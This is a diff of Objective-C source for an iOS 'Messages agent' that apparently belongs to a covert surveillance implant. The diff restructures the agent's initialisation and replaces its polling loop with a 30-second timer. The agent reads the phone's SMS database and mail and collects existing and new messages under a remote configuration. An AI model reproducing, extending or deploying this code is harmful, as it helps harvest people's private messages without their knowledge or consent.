@@ -1,5 +1,5 @@
 /*
- * RCSIpony - Messages agent
+ * RCSiOS - Messages agent
  *
  *
  * Created by Massimo Chiodini on 01/10/2009
@@ -22,8 +22,7 @@
 #define MAIL_TYPE     4
 #define IN_SMS        2
 #define OUT_SMS       3
-#define MSG_POLL_TIME 1
-#define MSG_WAIT_TIME 30
+
 #define SMS_DB_SIMULATOR "/tmp/sms.db"
 #define SMS_DB_IPHONE_OS "/var/mobile/Library/SMS/sms.db"
 
@@ -45,8 +44,6 @@ typedef struct _logMessageHeader {
 } logMessageHeader;
 
 //#define DEBUG
-
-static RCSIAgentMessages *sharedAgentMessages = nil;
 
 int dummy_f()
 {
@@ -1782,218 +1779,107 @@ typedef struct _message_config_t {
 
 @implementation RCSIAgentMessages 
 
-@synthesize mAgentConfiguration;
-
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSIAgentMessages *)sharedInstance
+- (id)initWithConfigData:(NSData*)aData
 {
-  @synchronized(self)
+  self = [super initWithConfigData: aData];
+
+  if (self != nil)
     {
-      if (sharedAgentMessages == nil)
-        {
-          //
-          // Assignment is not done here
-          //
-          [[self alloc] init];
-        }
+      time_t currentTime;
+    
+      // will get only new sms...
+      time(&currentTime);
+     
+      mFirstCollectorSMS  = 0;//ALL_MSG;
+      mLastCollectorSMS   = 0;//ALL_MSG;
+      mLastRealTimeSMS    = 0;
+      //mLastRealTimeSMS    = currentTime;
+      mFirstCollectorMail = 0;
+      mLastCollectorMail  = 0;
+      mLastRealTimeMail   = currentTime;
+      mSMS                = 0;  
+      mAgentID            = AGENT_MESSAGES;
     }
   
-  return sharedAgentMessages;
-}
-
-+ (id)allocWithZone: (NSZone *)aZone
-{
-  @synchronized(self)
-    {
-      if (sharedAgentMessages == nil)
-        {
-          sharedAgentMessages = [super allocWithZone: aZone];
-          
-          //
-          // Assignment and return on first allocation
-          //
-          return sharedAgentMessages;
-        }
-    }
-  
-  // On subsequent allocation attemps return nil
-  return nil;
-}
-
-- (id)copyWithZone: (NSZone *)aZone
-{
   return self;
-}
-
-- (id)retain
-{
-  return self;
-}
-
-- (unsigned)retainCount
-{
-  // Denotes an object that cannot be released
-  return UINT_MAX;
-}
-
-- (void)release
-{
-  // Do nothing
-}
-
-- (id)autorelease
-{
-  return self;
-}
-
-- (id)init
-{
-  Class myClass = [self class];
-  
-  @synchronized(myClass)
-    {
-      if (sharedAgentMessages != nil)
-        {
-          self = [super init];
-          
-          if (self != nil)
-            {
-              time_t currentTime;
-            
-              // will get only new sms...
-              time(&currentTime);
-             
-              mFirstCollectorSMS  = 0;//ALL_MSG;
-              mLastCollectorSMS   = 0;//ALL_MSG;
-              mLastRealTimeSMS    = 0;
-              //mLastRealTimeSMS    = currentTime;
-              mFirstCollectorMail = 0;
-              mLastCollectorMail  = 0;
-              mLastRealTimeMail   = currentTime;
-              mSMS                = 0;
-              sharedAgentMessages = self;            
-            }
-          
-        }
-    }
-  
-  return sharedAgentMessages;
 }
 
 #pragma mark -
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
 
-- (void)start
+NSString *kRCSIAgentMessageskRunLoopMode = @"kRCSIAgentMessageskRunLoopMode";
+
+- (void)getMessagesWithFilter:(NSTimer*)theTimer
 {
-  id messageRawData;
-  int pollMax = 0;
+  [self _getMessagesWithFilter: REALTTIME_FILTER_TYPE andMessageType: ANY_TYPE];
+}
+
+- (void)setMsgPollingTimeOut:(NSTimeInterval)aTimeOut 
+{    
+  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
+                                                    target: self 
+                                                  selector: @selector(getMessagesWithFilter:) 
+                                                  userInfo: nil 
+                                                   repeats: YES];
   
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentMessageskRunLoopMode];
+}
+
+- (void)startAgent
+{
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
-#ifdef DEBUG
-  NSLog(@"Agent messages started");
-#endif
-
-  messageRawData = [mAgentConfiguration objectForKey: @"data"];
   
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
+  id messageRawData;
   
-  mMessageFilters = [[NSMutableArray alloc] initWithCapacity: 0];
-
-#ifdef DEBUG  
-  NSLog(@"start: mFirstCollectorSMS = %s (%ld) mLastCollectorSMS %s (%ld)", 
-        asctime(gmtime((time_t *)&mFirstCollectorSMS)), mFirstCollectorSMS, asctime(gmtime((time_t *)&mLastCollectorSMS)), mLastCollectorSMS);
-#endif
-  
-  if([self _parseJsonConfWithData: messageRawData] == NO)
+  if ([self mAgentStatus] != AGENT_STATUS_STOPPED || [self isThreadCancelled] == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"start: AgentMessages configuration error!");
-#endif
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
+      [outerPool release];
+      return;
     }
   
-  // Get last datetime for filter types...
+  messageRawData = [self mAgentConfiguration];
+  
+  if([self _parseJsonConfWithData: messageRawData] == NO || [self isThreadCancelled] == TRUE)
+    {
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
+      [outerPool release];
+      return;
+    }
+ 
+  mMessageFilters = [[NSMutableArray alloc] initWithCapacity: 0];
+
   [self _getAgentMessagesProperty];
   
-  // Running collector message grabber first
   [self _getMessagesWithFilter: COLLECT_FILTER_TYPE andMessageType: ANY_TYPE];
   
-//  // Receive notification for incoming messages (privateFrameworks)
-//  id ct = CTTelephonyCenterGetDefault();
+  [self setMsgPollingTimeOut: 30.0];
   
-//  // add the callback for messages (privateFrameworks)
-//  CTTelephonyCenterAddObserver(ct, 
-//                               self, 
-//                               MsgNotificationCallback,
-//                               kCTMessageReceivedNotification,
-//                               NULL,
-//                               CFNotificationSuspensionBehaviorDeliverImmediately);
- 
-//#ifdef DEBUG
-//  NSLog(@"start: messages agent setting callback on id 0x%X on callback 0x%x", 
-//        ct, (void *) MsgNotificationCallback);
-//#endif
-  
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
+  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
-//      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: MSG_POLL_TIME]];
-    
-      sleep(MSG_POLL_TIME);
-      pollMax++;
-    
-//      // SMS by notifications...
-//      if (mSMS > 0) 
-      if (pollMax == MSG_WAIT_TIME)
-        {
-#ifdef DEBUG
-          NSLog(@"%s: poll time reached (%ld)", __FUNCTION__, pollMax);
-#endif        
-          [self _getMessagesWithFilter: REALTTIME_FILTER_TYPE andMessageType: ANY_TYPE];
-          pollMax = 0;
-        }
+        
+      [[NSRunLoop currentRunLoop] runMode:kRCSIAgentMessageskRunLoopMode 
+                               beforeDate:[NSDate dateWithTimeIntervalSinceNow: 1.0]];
     
       [innerPool release];
     }
-  
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-    [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-  
-//  // Removing callback (privateFrameworks)
-//  CTTelephonyCenterRemoveObserver(ct, self, kCTMessageReceivedNotification, NULL);
-  
-  // Removing filters...
+    
   [mMessageFilters release];
-  
-  [mAgentConfiguration release];
-  mAgentConfiguration = nil;
+
+  [self setMAgentStatus: AGENT_STATUS_STOPPED];
   
   [outerPool release];
 }
   
-- (BOOL)stop
+- (BOOL)stopAgent
 {
-  int internalCounter = 0;
-  
-  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
-  
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
-         internalCounter <= MAX_WAIT_TIME)
-    {
-      internalCounter++;
-      sleep(1);
-    }
-
-#ifdef DEBUG
-  NSLog(@"Agent Messages stopped");
-#endif
-  
+  [self setMAgentStatus: AGENT_STATUS_STOPPING];  
   return YES;
 }
 
